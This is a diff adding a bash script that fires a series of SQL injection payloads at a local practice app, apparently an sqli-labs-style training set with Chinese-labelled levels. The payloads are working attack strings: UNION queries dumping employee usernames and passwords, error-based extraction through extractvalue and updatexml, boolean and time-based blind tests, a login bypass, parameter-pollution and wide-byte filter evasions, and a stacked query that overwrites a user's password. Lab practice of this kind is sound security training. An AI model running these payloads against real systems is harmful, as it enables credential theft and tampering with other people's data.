@@ -1,0 +1,53 @@
+#!/bin/bash
+B="http://127.0.0.1/_oatest/app/challenge.php"
+g() { curl -s -G "$B" --data-urlencode "c=$1" --data-urlencode "$2" | grep -oE 'result-value">[^<]*|sys-note">[^<]*|sys-info">[^<]*' | head -3; }
+p() { curl -s -X POST "$B?c=$1" --data-urlencode "$2" --data-urlencode "$3" | grep -oE 'result-value">[^<]*|sys-note">[^<]*|sys-info">[^<]*' | head -3; }
+t() { curl -s -o /dev/null -w "耗时 %{time_total}s\n" -G "$B" --data-urlencode "c=$1" --data-urlencode "$2"; }
+
+echo "### L1 正常"
+g "Less-1" "id=1"
+echo "### L1 union"
+g "Less-1" "id=-1' union select 1,group_concat(username,0x3a,password),3 from oa_employee-- -"
+echo "### L2 整型 union"
+g "Less-2" "id=-1 union select 1,group_concat(username,0x3a,password),3 from oa_employee-- -"
+echo "### L3 单引号括号"
+g "Less-3" "id=-1') union select 1,group_concat(username,0x3a,password),3 from oa_employee-- -"
+echo "### L4 双引号括号"
+g "Less-4" "id=-1\") union select 1,group_concat(username,0x3a,password),3 from oa_employee-- -"
+echo "### L5 extractvalue"
+g "Less-5" "id=1' and extractvalue(1,concat(0x7e,(select password from oa_employee where username='admin'),0x7e))-- -"
+echo "### L6 updatexml 双引号"
+g "Less-6" "id=1\" and updatexml(1,concat(0x7e,(select password from oa_employee where username='admin'),0x7e),1)-- -"
+echo "### L8 布尔真/假"
+g "Less-8" "id=1' and 1=1-- -"
+g "Less-8" "id=1' and 1=2-- -"
+echo "### L9 时间盲注 (sleep 3)"
+t "Less-9" "id=1' and if(1=1,sleep(3),0)-- -"
+echo "### L10 双引号时间"
+t "Less-10" "id=1\" and if(1=1,sleep(3),0)-- -"
+echo "### L11 登录万能钥匙"
+p "Less-11" "uname=admin' or 1=1-- -" "passwd=1"
+echo "### L11 登录 union"
+p "Less-11" "uname=-1' union select username,password from oa_employee-- -" "passwd=1"
+echo "### L13 报错"
+p "Less-13" "uname=admin') and extractvalue(1,concat(0x7e,(select password from oa_employee where username='admin'),0x7e))-- -" "passwd=1"
+echo "### L15 时间盲注 POST"
+curl -s -o /dev/null -w "耗时 %{time_total}s\n" -X POST "$B?c=Less-15" --data-urlencode "uname=admin' and if(1=1,sleep(3),0)-- -" --data-urlencode "passwd=1"
+echo "### L17 UPDATE 报错注入"
+curl -s -X POST "$B?c=Less-17" --data-urlencode "uname=admin" --data-urlencode "passwd=1' and extractvalue(1,concat(0x7e,(select password from oa_employee where username='lina'),0x7e))-- -" | grep -oE 'sys-note">[^<]*|sys-info">[^<]*' | head -2
+echo "### L23 无注释 union"
+g "Less-23" "id=-1' union select 1,group_concat(username,0x3a,password),3 from oa_employee where '1'='1"
+echo "### L25 双写"
+g "Less-25" "id=-1' union select 1,group_concat(username,0x3a,passwoorrd),3 from oa_employee-- -"
+echo "### L29 HPP"
+curl -s "$B?c=Less-29&id=1&id=-1%27%20union%20select%201,group_concat(username,0x3a,password),3%20from%20oa_employee--%20-" | grep -oE 'result-value">[^<]*|sys-note">[^<]*' | head -3
+echo "### L29 WAF 拦截"
+g "Less-29" "id=-1' union select 1,2,3-- -"
+echo "### L32 宽字节"
+curl -s "$B?c=Less-32&id=1%df%27%20union%20select%201,group_concat(username,0x3a,password),3%20from%20oa_employee--%20-" | grep -oE 'result-value">[^<]*|sys-note">[^<]*' | head -3
+echo "### L38 堆叠 UPDATE"
+g "Less-38" "id=1';update oa_employee set password='pwned' where username='hejun'-- -"
+echo "### L46 ORDER BY 报错"
+g "Less-46" "sort=1 and extractvalue(1,concat(0x7e,(select password from oa_employee where username='admin'),0x7e))-- -"
+echo "### L46 正常排序"
+curl -s -G "$B" --data-urlencode "c=Less-46" --data-urlencode "sort=emp_no desc" | grep -oE '<td>[^<]*</td>' | head -6
